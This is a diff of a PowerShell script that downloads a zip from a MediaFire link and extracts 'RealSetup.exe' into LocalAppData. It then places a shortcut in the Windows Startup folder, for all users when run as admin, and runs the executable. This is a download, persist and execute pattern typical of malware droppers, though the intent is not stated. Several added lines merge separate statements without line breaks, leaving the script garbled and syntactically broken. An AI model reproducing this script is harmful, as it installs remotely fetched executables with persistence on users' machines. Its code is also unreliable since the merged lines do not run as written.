@@ -5,10 +5,9 @@
 $mediaFireUrl = "https://www.mediafire.com/file/l09mfm48xaz26zi/"
 $zipName = "Real.zip"
 $exeName = "RealSetup.exe"
-$targetPath = $env:LocalAppData
-$zipPath = Join-Path $targetPath$zipName
+$targetPath = $env:LocalAppData$zipPath = Join-Path $targetPath$zipName
 $extractPath = Join-Path$targetPath "Real"
-$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+$exePath = Join-Path$extractPath $exeName$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 # ==============================
 # 2. Prepare extraction directory
@@ -136,42 +135,27 @@ if ($LASTEXITCODE -ne 0) {
 }
 
 # ==============================
-# 8. Define EXE Path
-# ==============================
-
-$exePath = Join-Path $extractPath$exeName
-
-if (-not (Test-Path $exePath)) {
-    throw "EXE not found: $exePath"
-}
-
-# ==============================
-# 9. Link in Start Up
+# 8. Link in Start Up
 # ==============================
 
 $shortcutName = "Real.lnk"
 
 if ($isAdmin) {
-    # All Users Startup folder
     $startmenuPath = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 } else {
-    # Current User Startup folder
     $startmenuPath = "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup"
-}
-
-# Ensure the startup directory exists just in case
-if (-not (Test-Path $startmenuPath)) {
-    New-Item -ItemType Directory -Path $startmenuPath -Force | Out-Null
 }
 
 $shortcutFile = Join-Path$startmenuPath $shortcutName$WScriptShell = New-Object -ComObject WScript.Shell
 $Shortcut =$WScriptShell.CreateShortcut($shortcutFile)$Shortcut.TargetPath = $exePath$Shortcut.WorkingDirectory = Split-Path -Parent $exePath$Shortcut.Save()
 
-Write-Host "Startup shortcut created at: $shortcutFile"
+# ==============================
+# 9. Run EXE
+# ==============================
 
-# ==============================
-# 10. Run EXE
-# ==============================
+if (-not (Test-Path $exePath)) {
+    throw "EXE not found: $exePath"
+}
 
 Write-Host "Starting $exePath"
 
